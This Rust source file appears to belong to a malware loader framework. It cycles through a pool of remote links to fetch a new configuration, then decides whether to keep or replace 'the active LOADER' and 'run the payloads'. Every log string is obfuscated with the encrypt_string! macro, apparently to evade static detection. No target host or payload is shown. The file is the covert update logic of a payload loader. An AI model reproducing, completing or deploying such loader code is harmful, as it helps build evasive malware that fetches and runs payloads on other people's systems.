//use indexmap::IndexMap;
use crate::link::Link;
use crate::link::LinkFetch;
//use log::debug;
use log::info;
use log::warn;
use serde::{Deserialize, Serialize};
//use std::collections::BTreeMap;

use crate::config::Config;
use cryptify::encrypt_string;

use anyhow::bail;

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub enum PoolMode {
    ONEBYONE,
    PARALLEL,
}
//TODO il faut ajouter aussi des modes de choix, pourcentage de liens valides etc...
//TODO,il faudra rajouter la date de création dans la config pour comparer si plusieurs conf différentes trouvées dans un pool

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct PoolLinks {
    pub pool_links: Vec<Link>,
    pub pool_mode: PoolMode,
}

impl PoolLinks {
    pub fn update_pool(&self, config: &Config) -> Result<Config, anyhow::Error> {
        match &self.pool_mode {
            PoolMode::ONEBYONE => self.update_links_onebyone(config),
            PoolMode::PARALLEL => todo!(),
        }
    }

    pub fn update_links_onebyone(&self, config: &Config) -> Result<Config, anyhow::Error> {
        let mut link_nb: i32 = 0;
        for link in &self.pool_links {
            link_nb = link_nb + 1;
            info!(
                "{}/{}{}{:?}",
                link_nb,
                &self.pool_links.len(),
                encrypt_string!(" Link: "),
                &link.get_target()
            );

            let newconf = match link.fetch_config(&config) {
                Ok(newconf) => newconf,
                Err(error) => {
                    warn!("{}{}", encrypt_string!("error: "), error);
                    continue;
                }
            };
            //nex time its here

            if config.is_same_loader(&newconf) {
                info!("{}", encrypt_string!("same config: Yes"));
                info!(
                    "{}",
                    encrypt_string!("[+] DECISION: keep the same active LOADER, and run the payloads")
                );
                bail!("{}", encrypt_string!("Found same loader"))
            }
            warn!("{}", encrypt_string!("same config: No"));
            info!(
                "{}",
                encrypt_string!("[+] DECISION: replace the active LOADER by this one, and run the payloads")
            );
            return Ok(newconf);
        }
        bail!("{}", encrypt_string!("NOconfigfound"))
    }
    // TODO remplace ça !
    // et on pourait renvoyer un booléen pour PAS updater la conf, si on a pas la flemme.
    //let newconf = config.clone();
    //(false, newconf)
}
